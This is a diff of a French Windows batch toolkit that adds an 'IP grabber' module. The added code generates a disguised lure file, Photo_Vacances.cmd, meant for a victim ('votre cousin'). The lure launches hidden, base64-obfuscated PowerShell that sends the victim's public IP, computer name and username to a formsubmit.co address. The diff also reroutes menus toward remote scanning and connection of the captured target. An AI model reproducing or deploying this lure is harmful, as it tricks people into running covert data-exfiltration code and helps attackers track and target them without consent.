->> "%PS_GRAB%" echo Write-Host '  (Appuyez sur une touche pour revenir au menu)' -f Gray
-
-powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB%"
-if exist "%PS_GRAB%" del "%PS_GRAB%"
+>> "%PS_EM%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
+>> "%PS_EM%" echo $u = 'https://formsubmit.co/%gemail%'
+>> "%PS_EM%" echo $psp = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{IP=`$ip;Machine=`$env:COMPUTERNAME;Session=`$env:USERNAME;_subject='Cible Identifiee';_captcha='false'}; Invoke-RestMethod -Uri `$u -Method Post -Body `$b -UseBasicParsing } catch {}"
+>> "%PS_EM%" echo $bytes = [System.Text.Encoding]::Unicode.GetBytes($psp)
+>> "%PS_EM%" echo $b64 = [Convert]::ToBase64String($bytes)
+>> "%PS_EM%" echo $obf = "@echo off`
+`
+start /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64`
+`
+exit"
+>> "%PS_EM%" echo Set-Content -Path $cmdPath -Value $obf -Encoding ASCII
+>> "%PS_EM%" echo Write-Host '  [OK] Piege : Photo_Vacances.cmd sur le Bureau' -f Green
+>> "%PS_EM%" echo Write-Host "  [i] Envoi de l'IP vers : %gemail%" -f DarkGray
+>> "%PS_EM%" echo Write-Host '  [i] Quand vous recevez l''email avec l''IP,' -f Yellow
+>> "%PS_EM%" echo Write-Host '      revenez et choisissez [MANUEL].' -f Yellow
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_EM%"
+if exist "%PS_EM%" del /f /q "%PS_EM%"
+echo.
 pause >nul
-goto net_cyber_menu
+goto cyber_grabber_methods
 
+REM --- [5] Saisie Manuelle ---
+:gm_manual_ip
+cls
+echo.
+echo  ================================================
+echo   [MANUEL] SAISIR L'IP DE VOTRE COUSIN
+echo  ================================================
+echo.
+echo  Demandez a votre cousin de :
+echo.
+echo  [Option A] Ouvrir CMD et taper : ipconfig
+echo             Donner l'adresse IPv4 (ex: 192.168.x.x ou 10.0.x.x)
+echo             (fonctionne si meme reseau ou VPN)
+echo.
+echo  [Option B] Aller sur https://monip.org
+echo             Communiquer l'IP affichee (ex: 82.xx.xx.xx)
+echo             (IP publique, pour connexion inter-batiments)
+echo.
+call :InputWithEsc "IP de votre cousin : " remote_ip
+if errorlevel 1 goto cyber_grabber_methods
+if not defined remote_ip goto cyber_grabber_methods
+set "remote_pc="
+set "remote_port=NONE"
+echo.
+echo  [-^>] IP enregistree : !remote_ip!
+echo  [-^>] Lancement du scan dans 2 secondes...
+timeout /t 2 >nul
+goto cyber_remote_menu
 :cyber_triage
 cls
 echo.
@@ -2197,22 +2391,7 @@ REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 
 :cyber_lan_scan
-cls
-echo.
-echo  ================================================
-echo   SCANNER DE FAILLES RESEAU ET CONNEXION DISTANTE
-echo  ================================================
-echo.
-set "opts=Analyser le reseau local (Mode LAN Automatique);Analyser une IP ou un sous-reseau distant;Analyse des failles et Connexion distante"
-call :DynamicMenu "CHOIX DU SCAN" "%opts%" "NONUMS NOCLS"
-set "c_lan=%errorlevel%"
-
-if "%c_lan%"=="0" goto net_cyber_menu
-if "%c_lan%"=="3" goto cyber_remote_connect
-if "%c_lan%"=="2" goto cyber_lan_custom
-if "%c_lan%"=="1" goto cyber_lan_auto
-goto cyber_lan_scan
-
+goto cyber_ip_grabber
 :cyber_lan_auto
 set "base_ip=AUTO"
 goto start_lan_scan
@@ -2236,8 +2415,8 @@ echo      Utilisez le module IP GRABBER pour obtenir son IP, puis
 echo      connectez-vous en SSH ou WinRM pour un scan interne reel.
 echo.
 call :InputWithEsc "Base IP ou IP unique : " base_ip
-if errorlevel 1 goto cyber_lan_scan
-if "%base_ip%"=="" goto cyber_lan_scan
+if errorlevel 1 goto cyber_ip_grabber
+if "%base_ip%"=="" goto cyber_ip_grabber
 goto start_lan_scan
 
 :cyber_remote_connect
@@ -2251,14 +2430,14 @@ echo  [i] Pour eviter les conflits avec votre reseau local,
 echo      utilisez l'IP PUBLIQUE ou un DNS (ex: ma-box.ddns.net).
 echo.
 call :InputWithEsc "IP Cible ou DNS (ex: 82.x.x.x) : " remote_ip
-if errorlevel 1 goto cyber_lan_scan
-if "%remote_ip%"=="" goto cyber_lan_scan
+if errorlevel 1 goto cyber_ip_grabber
+if "%remote_ip%"=="" goto cyber_ip_grabber
 
 echo.
 echo  [?] Port specifique ? (Laissez vide pour les ports par defaut)
 echo      (Ex: 2222 si votre box redirige le port 2222 vers le 22 d'un PC)
 call :InputWithEsc "Port (Optionnel) : " remote_port
-if errorlevel 1 goto cyber_lan_scan
+if errorlevel 1 goto cyber_ip_grabber
 if not defined remote_port set "remote_port=NONE"
 goto cyber_remote_menu
 
@@ -2304,7 +2483,7 @@ if "%rc_opt%"=="4" (
     pause
     goto cyber_remote_menu
 )
-if "%rc_opt%"=="5" goto cyber_lan_scan
+if "%rc_opt%"=="5" goto cyber_ip_grabber
 goto cyber_remote_menu
 
 :ig_remote_scan_process
